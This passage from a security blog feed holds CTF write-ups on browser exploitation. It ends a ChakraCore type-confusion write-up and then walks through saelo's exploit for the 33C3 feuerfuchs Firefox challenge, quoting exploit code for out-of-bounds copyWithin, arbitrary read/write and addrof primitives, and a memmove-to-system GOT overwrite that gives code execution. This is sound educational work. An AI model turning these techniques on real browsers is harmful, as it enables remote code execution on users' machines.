able to tamper the data type of <code>pDestArray</code> by defining the property of <code>Symbol.isConcatSpreadable</code>.</p><p>Here we modify <code>pDestArray</code>‘s data type from <code>JavascriptNativeIntArray</code> to <code>JavascriptArray</code> and trigger the type confusion bug. We can later exploit the bug to:</p><ol><li>Leak an object’s address</li><li>Fake an object at an arbitrary address</li></ol><p>To obtain the arbitrary read/write primitive, we fake an <code>Uint32Array</code> object, modify its data buffer’s pointer and obtain its object handle. Later we can use this handle to read/write memory content. We then leak the address of <code>libChakraCore.so</code> and <code>libc.so</code>, calculate <code>system</code>‘s address and overwrite <code>memmove</code>‘s GOT to do the GOT hijacking &amp; achieve RCE.</p><h2 id="Epilogue"><a href="#Epilogue" class="headerlink" title="Epilogue"></a>Epilogue</h2><p>Learn a lot from this one. Type confusion bugs are very common vulnerabilities in the real-world softwares, and this challenge is a great example of how it will affect the security of the modern browsers. </p><p>Next stop: <a href="https://github.com/saelo/v9" target="_blank" rel="noopener">V9</a> !</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/isConcatSpreadable" target="_blank" rel="noopener">isConcatSpreadable on MDN</a></li><li><a href="https://github.com/Microsoft/ChakraCore/wiki/Building-ChakraCore" target="_blank" rel="noopener">Building ChakraCore engine</a></li><li><a href="http://conference.hitb.org/hitbsecconf2017ams/materials/D1T2%20-%20Linan%20Hao%20and%20Long%20Liu%20-%20The%20Secret%20of%20ChakraCore.pdf" target="_blank" rel="noopener">The Secret of ChakraCore: 10 Ways to Go Beyond the Edge</a></li><li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Silvanovich-The-Origin-Of-Array-Symbol-Species.pdf" target="_blank" rel="noopener">The Origin of Array [@@species]</a></li><li><a href="http://mashirogod.dothome.co.kr/index.php/2017/01/07/first-step-to-browser-exploitation/" target="_blank" rel="noopener">First Step to Browser Exploitation (Korean)</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://ctftime.org/task/4088&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Chakrazy&lt;/a&gt; is a browser CTF challenge created by team PPP for the &lt;a href=&quot;https://ctftime.org/event/439&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;2017 PlaidCTF event&lt;/a&gt;. It’s a challenge based on Microsoft’s ChakraCore Javascript engine. You can download the challenge file &lt;a href=&quot;https://drive.google.com/file/d/1aaDLRdl19ffT1-pn_9o4gNTcbR9kwypG/view?usp=sharing&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Pwnable" scheme="https://bruce30262.github.io/tags/Pwnable/"/>
    
      <category term="Browser" scheme="https://bruce30262.github.io/tags/Browser/"/>
    
      <category term="Javascript" scheme="https://bruce30262.github.io/tags/Javascript/"/>
    
      <category term="Plaid" scheme="https://bruce30262.github.io/tags/Plaid/"/>
    
      <category term="Edge" scheme="https://bruce30262.github.io/tags/Edge/"/>
    
      <category term="ChakraCore" scheme="https://bruce30262.github.io/tags/ChakraCore/"/>
    
      <category term="type_confusion" scheme="https://bruce30262.github.io/tags/type-confusion/"/>
    
  </entry>
  
  <entry>
    <title>Learning browser exploitation via 33C3 CTF  feuerfuchs challenge</title>
    <link href="https://bruce30262.github.io/2017/12/15/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/"/>
    <id>https://bruce30262.github.io/2017/12/15/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/</id>
    <published>2017-12-15T13:24:00.000Z</published>
    <updated>2018-01-03T15:08:05.603Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>So I’ve been playing with the browser exploitation recently, by studying some browser CTF challenges. So far I’ve tried <a href="http://blog.frizn.fr/bkpctf-2016/qwn2own-bkpctf16" target="_blank" rel="noopener">qwn2own</a>, <a href="https://tradahacking.vn/hitb-2017-writeup-sgx-browser-5c1c48e0d6fe" target="_blank" rel="noopener">SGX_Browser</a> and <a href="https://github.com/saelo/feuerfuchs" target="_blank" rel="noopener">feuerfuchs</a>. </p><a id="more"></a><p>qwn2own and SGX_Browser are both great for getting started with the brower exploitation. However, they are not “real world” enough, since both of them are small, simple QT-based browser with custom Javascript extensions. To learn the real world browser exploitation, it’s better to start with <strong>feuerfuchs</strong>, a Firefox-based browser pwnable challenge created by <a href="https://twitter.com/5aelo" target="_blank" rel="noopener">saelo</a> for the <a href="https://archive.aachen.ccc.de/33c3ctf.ccc.ac/challenges/index.html" target="_blank" rel="noopener">2016 33C3 CTF</a>. </p><p>This write-up is more like a “learning note” stuff. Here I’ll write down my learning process, including how to debug the SpiderMonkey Javascript engine, how the vulnerability works, how to exploit the vulnerability, …. etc.</p><h2 id="Pre-knowledge"><a href="#Pre-knowledge" class="headerlink" title="Pre-knowledge"></a>Pre-knowledge</h2><p>Before we start, it is recommanded that the reader read this amazing <a href="http://www.phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">phrack paper</a> ( also authored by saelo ) and have some basic knowledge of the Javascript engine exploitation technique, especially the “Exploiting with valueOf” part, cause we’ll be using that later. </p><p>TL;DR:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.... The rules governing the conversion from object types to numbers </span><br><span class="line">(and primitive types in general) are especially interesting. </span><br><span class="line">In particular, if the object has a callable property named &quot;valueOf&quot;, </span><br><span class="line">this method will be called and the return value used if it is a primitive value.</span><br></pre></td></tr></table></figure></p><p>For instance, variable <code>hax</code> has the following <code>valueOf</code> property:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hax = &#123; <span class="attr">valueOf</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">'hello'</span>); <span class="keyword">return</span> <span class="number">0</span>; &#125; &#125;;</span><br></pre></td></tr></table></figure></p><p>When the Javscript engine tries to convert <code>hax</code> into an integer, it will first print out the message “hello” to the console, then return <code>0</code> as the integer value of <code>hax</code>:</p><p><img src="example_valueof.PNG" alt=""></p><p>So If we replace <code>console.log(&quot;hello&quot;)</code> with some malicious code ( e.g. modify an array’s length ), something bad might happen. This concept will be applied to the exploit of the challenge later.</p><h2 id="Environment-Setting"><a href="#Environment-Setting" class="headerlink" title="Environment Setting"></a>Environment Setting</h2><ul><li>Ubuntu Linux 16.04 64 bit</li><li>Firefox 50.1</li></ul><p>I’m also using <a href="https://github.com/hugsy/gef" target="_blank" rel="noopener">gef</a> to debug the SpiderMonkey Javascript engine.</p><h2 id="Building-and-Debugging-the-SpiderMonkey-Javascript-Engine"><a href="#Building-and-Debugging-the-SpiderMonkey-Javascript-Engine" class="headerlink" title="Building and Debugging the SpiderMonkey Javascript Engine"></a>Building and Debugging the SpiderMonkey Javascript Engine</h2><p>Since the challenge is to exploit the Javascript engine, we don’t have to debug the entire Firefox browser ( that, my friend, will be a huge pain in the ass ). Instead we’ll just build a JS shell and use it to run the exploit. </p><p>According to this <a href="https://wiki.mozilla.org/JavaScript:New_to_SpiderMonkey#Build_the_js_shell" target="_blank" rel="noopener">link</a>, we can build the JS shell ( with patch ) by using the following commands ( remember to copy the patch file into the directory first ):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd firefox-50.1.0/</span><br><span class="line">patch -p1 &lt; ./feuerfuchs.patch</span><br><span class="line">cd js/src/</span><br><span class="line">cp configure.in configure &amp;&amp; autoconf2.13</span><br><span class="line">mkdir build_DBG.OBJ </span><br><span class="line">cd build_DBG.OBJ </span><br><span class="line">../configure --enable-debug --disable-optimize</span><br><span class="line">make # or make -j8</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure><p>After that, we can just use</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef --args build_DBG.OBJ/dist/bin/js pwn.js</span><br></pre></td></tr></table></figure><p>to debug the Javascript engine and learn how the exploit works. </p><p>Now we’re all ready, let’s get started !</p><h2 id="Analyzing-the-Vulnerability-the-patch"><a href="#Analyzing-the-Vulnerability-the-patch" class="headerlink" title="Analyzing the Vulnerability ( the patch )"></a>Analyzing the Vulnerability ( the patch )</h2><p>Let’s start with the <a href="https://github.com/saelo/feuerfuchs/blob/master/feuerfuchs.patch" target="_blank" rel="noopener">patch</a> first: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">........................</span><br><span class="line">... ( other patch ).....</span><br><span class="line">........................</span><br><span class="line"></span><br><span class="line"> /* static */ const JSPropertySpec</span><br><span class="line"> TypedArrayObject::protoAccessors[] = &#123;</span><br><span class="line">-    JS_PSG(&quot;length&quot;, TypedArray_lengthGetter, 0),</span><br><span class="line">     JS_PSG(&quot;buffer&quot;, TypedArray_bufferGetter, 0),</span><br><span class="line">+    JS_PSGS(&quot;length&quot;, TypedArray_lengthGetter, TypedArray_lengthSetter, 0),</span><br><span class="line">     JS_PSG(&quot;byteLength&quot;, TypedArray_byteLengthGetter, 0),</span><br><span class="line">+    JS_PSGS(&quot;offset&quot;, TypedArray_offsetGetter, TypedArray_offsetSetter, 0),</span><br><span class="line">     JS_PSG(&quot;byteOffset&quot;, TypedArray_byteOffsetGetter, 0),</span><br><span class="line">     JS_PS_END</span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line">........................</span><br><span class="line">... ( other patch ).....</span><br><span class="line">........................</span><br></pre></td></tr></table></figure><p>We can see that the patch add <code>setter</code> to both <code>offset</code> and <code>length</code> property in the <code>TypedArray</code> class, which allow us to set the <code>offset</code> ( starting point of the data buffer ) and the <code>length</code> of a <code>TypedArray</code>. However the patch has also handled the boundary check for <code>offset</code> and <code>length</code> as well, so we can’t do something like <code>tarray.offset=10000</code> and use out-of-boundary (OOB) read/write to exploit the service. We’ll have to find another way to exploit the vulnerability.</p><h2 id="Analyzing-the-Exploit"><a href="#Analyzing-the-Exploit" class="headerlink" title="Analyzing the Exploit"></a>Analyzing the Exploit</h2><p>We now start analyzing the <a href="https://github.com/saelo/feuerfuchs/blob/master/exploit/pwn.js" target="_blank" rel="noopener">exploit code</a> that saelo wrote for this challenge.<br>The exploit function start at line 233:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Allocate multiple ArrayBuffers of the largest size such that the data is still stored inline</span></span><br><span class="line">    <span class="keyword">var</span> buffers = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        buffers.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">96</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffers[<span class="number">79</span>]); <span class="comment">// view is our TypedArray</span></span><br><span class="line">    <span class="keyword">var</span> hax = &#123; <span class="attr">valueOf</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; view.offset = <span class="number">88</span>; <span class="keyword">return</span> <span class="number">0</span>; &#125; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Trigger the bug first time to leak the data pointer of the following ArrayBuffer</span></span><br><span class="line">    view.copyWithin(hax, <span class="number">32</span>+<span class="number">8</span>, <span class="number">40</span>+<span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>To understand why the bug is triggered, we’ll have to dig into the source code of <a href="https://github.com/mozilla/gecko-dev/blob/c64d600a96280475b6306a3b1ff933431c572784/js/src/builtin/TypedArray.js#L156" target="_blank" rel="noopener">copyWithin</a>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TypedArrayCopyWithin</span>(<span class="params">target, start, end = undefined</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// target = 0 ( = hax);</span></span><br><span class="line">    <span class="comment">// start = 40;</span></span><br><span class="line">    <span class="comment">// end = 48;</span></span><br><span class="line">    .....................</span><br><span class="line">    <span class="keyword">var</span> obj = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">var</span> len = TypedArrayLength(obj); <span class="comment">// len = 96</span></span><br><span class="line"></span><br><span class="line">    assert(<span class="number">0</span> &lt;= len &amp;&amp; len &lt;= <span class="number">0x7FFFFFFF</span>,</span><br><span class="line">           <span class="string">"assumed by some of the math below, see also the other assertions"</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// the following line trigger the "valueOf" function</span></span><br><span class="line">     <span class="comment">// this make the view's offset = 88 and length = 8</span></span><br><span class="line">     <span class="comment">// however, "len" variable is still 96</span></span><br><span class="line">    <span class="keyword">var</span> relativeTarget = ToInteger(target);  <span class="comment">// trigger valueOf</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* to = 0 */</span></span><br><span class="line">    <span class="keyword">var</span> to = relativeTarget &lt; <span class="number">0</span> ? std_Math_max(len + relativeTarget, <span class="number">0</span>)</span><br><span class="line">                                : std_Math_min(relativeTarget, len);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> relativeStart = ToInteger(start);</span><br><span class="line">    <span class="comment">/* from = 40 */</span></span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">from</span> = relativeStart &lt; <span class="number">0</span> ? std_Math_max(len + relativeStart, <span class="number">0</span>)</span><br><span class="line">                                 : std_Math_min(relativeStart, len);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> relativeEnd = end === <span class="literal">undefined</span> ? len</span><br><span class="line">                                        : ToInteger(end);</span><br><span class="line">    <span class="comment">/* final = 48 */</span>    </span><br><span class="line">    <span class="keyword">var</span> final = relativeEnd &lt; <span class="number">0</span> ? std_Math_max(len + relativeEnd, <span class="number">0</span>)</span><br><span class="line">                                : std_Math_min(relativeEnd, len);</span><br><span class="line">    <span class="comment">/* count = 8 */</span></span><br><span class="line">    <span class="keyword">var</span> count = std_Math_min(final - <span class="keyword">from</span>, len - to);</span><br><span class="line"></span><br><span class="line">    ....................................</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">        MoveTypedArrayElements(obj, to | <span class="number">0</span>, <span class="keyword">from</span> | <span class="number">0</span>, count | <span class="number">0</span>); <span class="comment">// call memmove inside</span></span><br></pre></td></tr></table></figure><p>Let’s sum up some important part of this function:</p><ul><li>It first read the <code>view</code>‘s length and stored the value in the <code>len</code> variable. Later it will use this variable to perform some boundary check.</li><li>However, at line 15 the <code>ToInteger(target)</code> will trigger the <code>valueOf</code> function in variable <code>hax</code>, making <code>view</code>‘s <code>offset</code> become <code>88</code>, <code>length</code> become <code>8</code>.</li><li>But the code still use <code>len</code> variable ( which in this case = <code>96</code> ) to perform the boundary check, making us able to bypass the checks and eventually calling <code>MoveTypedArrayElements(obj, to | 0, from | 0, count | 0);</code></li></ul><p>Inside the <code>MoveTypedArrayElements</code> will call <code>memmove(dest, src, count)</code>, which in this case:</p><ul><li><code>src</code> will be <code>view&#39;s data pointer + 88 + 40</code></li><li><code>dest</code> will be <code>view&#39;s data pointer + 88</code></li><li><code>count</code> will be <code>8</code></li></ul><p>Let’s see what data will be copied to <code>dest</code>:</p><p><img src="copy_addr.PNG" alt=""></p><p>Here <code>dest</code> = <code>0x7ffff7ebc558</code> and <code>src</code> = <code>0x7ffff7ebc580</code>, we can see the value <code>0x3ffffbf5e2d0</code> will be copied to <code>dest</code>. According to saelo’s comment in the exploit:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// First qword in adjusted view now contains the data pointer (which is stored as a Private, thus needs to be shifted)</span></span><br><span class="line"><span class="keyword">var</span> ptr = LShift1(<span class="keyword">new</span> Int64(view));</span><br><span class="line"><span class="comment">// ptr will point to inline data so we can calculate the address of the preceeding ArrayBuffer</span></span><br><span class="line"><span class="keyword">var</span> addressOfInnerArrayBuffer = Sub(ptr, <span class="number">8</span>*<span class="number">8</span> + <span class="number">8</span>*<span class="number">8</span> + <span class="number">8</span>*<span class="number">12</span>);</span><br></pre></td></tr></table></figure><p>So <code>0x3ffffbf5e2d0</code> is actually a data pointer of an ArrayBuffer in its “Private” form. If we left shift the value 1 bit, it will become <code>0x7ffff7ebc5a0</code>, which is the data pointer of <code>buffers[80]</code>.</p><blockquote><p>I’ve traced the source code of SpiderMonkey and couldn’t find the definition of the “Private form”, so I still don’t know why you need to left shift the value 1 bit to get the correct address of the data pointer. I would really appreciate it if someone can tell me where the definition is.</p></blockquote><p>So what <code>view.copyWithin(hax, 32+8, 40+8);</code> does is copy the next ArrayBuffer’s ( <code>buffers[80]</code> ) data pointer into TypedArray <code>view</code> . </p><p>Later it stores the data pointer into <code>ptr</code>, and minus <code>224</code> to get the <code>addressOfInnerArrayBuffer</code>, which in this case is <code>0x7ffff7ebc4c0</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef➤  tel 0x7ffff7ebc4c0</span><br><span class="line">0x00007ffff7ebc4c0│+0x00: 0x00007ffff7eb90d0  &lt;-- group_</span><br><span class="line">0x00007ffff7ebc4c8│+0x08: 0x00007ffff7eb73d0  &lt;-- shape_</span><br><span class="line">0x00007ffff7ebc4d0│+0x10: 0x0000000000000000  &lt;-- slots_</span><br><span class="line">0x00007ffff7ebc4d8│+0x18: 0x00000000013c7b70  &lt;-- elements_</span><br><span class="line">0x00007ffff7ebc4e0│+0x20: 0x00003ffffbf5e280  &lt;-- data pointer</span><br><span class="line">0x00007ffff7ebc4e8│+0x28: 0xfff8800000000060  &lt;-- length</span><br><span class="line">0x00007ffff7ebc4f0│+0x30: 0xfffe7ffff4601e60  &lt;-- JSObject ( point to Uint8Array )</span><br><span class="line">0x00007ffff7ebc4f8│+0x38: 0xfff8800000000000  &lt;-- offet</span><br><span class="line">0x00007ffff7ebc500│+0x40: 0x0000000000000000  &lt;-- start point of a data pointer</span><br><span class="line">0x00007ffff7ebc508│+0x48: 0x0000000000000000</span><br></pre></td></tr></table></figure><p>We can see that <code>0x7ffff7ebc4c0</code> is “the address of <code>buffers[79]</code>“. If we left shift the data pointer <code>0x3ffffbf5e280</code>, we’ll get <code>0x7ffff7ebc500</code> – the data pointer of <code>buffers[79]</code>. </p><p>Let’s see what does the exploit do next:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Trigger the bug a second time to write the modified data pointer</span></span><br><span class="line">view.set(RShift1(addressOfInnerArrayBuffer).bytes());</span><br><span class="line">view.offset = <span class="number">0</span>;</span><br><span class="line">view.copyWithin(<span class="number">32</span>+<span class="number">8</span>, hax, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>It triggers the bug second time, and modified <code>buffers[80]</code>‘s data pointer into <code>addressOfInnerArrayBuffer</code>. This make us able to modified <code>buffers[79]</code>‘s structure by editing <code>buffers[80]</code>, and thus we’ll have an arbitrary read/write primitive !</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// |outer| is a byte view onto the corrupted ArrayBuffer which now allows us to arbitrarily modify the ArrayBuffer |inner|</span></span><br><span class="line"><span class="keyword">var</span> inner = buffers[<span class="number">79</span>];</span><br><span class="line"><span class="keyword">var</span> outer = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer); <span class="comment">// here buffer = buffers[80]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Increase the size of the inner ArrayBuffer</span></span><br><span class="line">outer[<span class="number">43</span>] = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Object to access the process' memory</span></span><br><span class="line"><span class="keyword">var</span> memory = &#123;</span><br><span class="line">    write: <span class="function"><span class="keyword">function</span>(<span class="params">addr, data</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Set data pointer of |inner|</span></span><br><span class="line">        outer.set(RShift1(addr).bytes(), <span class="number">32</span>);</span><br><span class="line">        <span class="comment">// Uint8Array's cache the data pointer of the underlying ArrayBuffer</span></span><br><span class="line">        <span class="keyword">var</span> innerView = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(inner);</span><br><span class="line">        innerView.set(data);</span><br><span class="line">    &#125;,</span><br><span class="line">    read: <span class="function"><span class="keyword">function</span>(<span class="params">addr, length</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Set data pointer of |inner|</span></span><br><span class="line">        outer.set(RShift1(addr).bytes(), <span class="number">32</span>);</span><br><span class="line">        <span class="comment">// Uint8Array's cache the data pointer of the underlying ArrayBuffer</span></span><br><span class="line">        <span class="keyword">var</span> innerView = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(inner);</span><br><span class="line">        <span class="keyword">return</span> innerView.slice(<span class="number">0</span>, length);</span><br><span class="line">    &#125;,</span><br><span class="line">    readPointer: <span class="function"><span class="keyword">function</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Int64(<span class="keyword">this</span>.read(addr, <span class="number">8</span>));</span><br><span class="line">    &#125;,</span><br><span class="line">    addrof: <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// To leak the address of |obj|, we set it as property of the |inner|</span></span><br><span class="line">        <span class="comment">// ArrayBuffer, then leak that using the existing read() method.</span></span><br><span class="line">        inner.leakMe = obj;</span><br><span class="line">        <span class="keyword">var</span> addressOfSlotsArray = <span class="keyword">this</span>.readPointer(Add(addressOfInnerArrayBuffer, <span class="number">2</span>*<span class="number">8</span>));</span><br><span class="line">        <span class="keyword">return</span> Int64.fromJSValue(<span class="keyword">this</span>.read(addressOfSlotsArray, <span class="number">8</span>));</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>memory</code> object handles all of the memory read/write operation. For arbitrary read/write, it will first use the <code>outer</code> object to modify pointer in the <code>inner</code> object, then use <code>inner</code> object to read/write data. </p><p>Note that <code>addrof</code> function is for leaking an object’s address ( like <code>&amp;</code> in the C language ). Here it uses a very clever method: <strong>By exploiting the <code>slots_</code> member.</strong></p><p>The <code>slots_</code> member is used for storing the info of an object’s properties. Before storing the <code>leakMe</code> property, there’s nothing in <code>inner</code>‘s <code>slots_</code> member:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  tel 0x7ffff7ebc4c0</span><br><span class="line">0x00007ffff7ebc4c0│+0x00: 0x00007ffff7eb90d0  &lt;-- group_</span><br><span class="line">0x00007ffff7ebc4c8│+0x08: 0x00007ffff7eb73d0  &lt;-- shape_</span><br><span class="line">0x00007ffff7ebc4d0│+0x10: 0x0000000000000000  &lt;-- slots_ ( empty )</span><br><span class="line">0x00007ffff7ebc4d8│+0x18: 0x00000000013c7b70  &lt;-- elements_</span><br><span class="line">.........</span><br></pre></td></tr></table></figure><p>After storing the <code>leakMe</code> property, the <code>slots_</code> member become an address which points to the object’s address:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  tel 0x7ffff7ebc4c0</span><br><span class="line">0x00007ffff7ebc4c0│+0x00: 0x00007ffff7eb90d0  &lt;-- group_</span><br><span class="line">0x00007ffff7ebc4c8│+0x08: 0x00007ffff7eb73d0  &lt;-- shape_</span><br><span class="line">0x00007ffff7ebc4d0│+0x10: 0x00007ffff69af940  →  0xfffe7ffff7eac700</span><br><span class="line">0x00007ffff7ebc4d8│+0x18: 0x00000000013c7b70  &lt;-- elements_</span><br><span class="line">................</span><br></pre></td></tr></table></figure><p>Here in this case, the exploit leak the address of the <code>Math.max</code> function object, so here <code>0x7ffff7eac700</code> points to the <code>Math.max</code> function object:</p><p><img src="max_func.png" alt=""></p><p>The rest of the exploit can be summed up as the following steps:</p><ol><li>First leak the function address of <code>Math.max</code> ( which lies in <code>libxul.so</code> ), and calculate the base address of <code>libxul.so</code>.</li><li>Leak <code>memmove</code> and <code>sscanf</code>‘s GOT in <code>libxul.so</code>, and calculate <code>system</code>‘s address.</li><li>Create a TypedArray <code>target</code> and write the command we want to execute into that TypedArray.</li><li>Overwrite <code>memmove</code>‘s GOT in <code>libxul.so</code> to <code>system</code>‘s address.</li><li>Call <code>target.copyWithin(0, 1);</code>. This will eventually call <code>memmove(&quot;our_command&quot;)</code>, which will now be <code>system(&quot;our_command&quot;)</code>, making us able to achieve RCE.</li></ol><h2 id="Summarize"><a href="#Summarize" class="headerlink" title="Summarize"></a>Summarize</h2><p>With the ability to set the <code>offset</code> and <code>length</code> property of a <code>TypedArray</code>, we exploit the <code>valueOf</code> and <code>copyWithin</code> functions, so when the Javascript engine tries to convert an object into an integer, it will modify the <code>offset</code> property and achieve OOB access during the <code>memmove</code> operation. </p><p>We then leak &amp; calculate the “address of <code>buffers[79]</code>“, and overwrite <code>buffers[80]</code>‘s data pointer with its value, so we can have an arbitrary read/write primitive.</p><p>After that we leak the function and GOT’s address, overwrite <code>memmove</code>‘s GOT in <code>libxul.so</code> with <code>system</code>‘s address, then call <code>copyWithin</code> to trigger <code>memmove</code> and execute our own command.</p><h2 id="Epilogue"><a href="#Epilogue" class="headerlink" title="Epilogue"></a>Epilogue</h2><p>To me browser exploitation is a whole new area. I spent almost a month to study the whole stuff, and I certainly still have a lot more to learn. </p><p>For my next browser CTF challenge I would like to try <a href="https://ctftime.org/task/4088" target="_blank" rel="noopener">Chakrazy</a>, a challenge based on Microsoft’s Chakra Javascript engine. 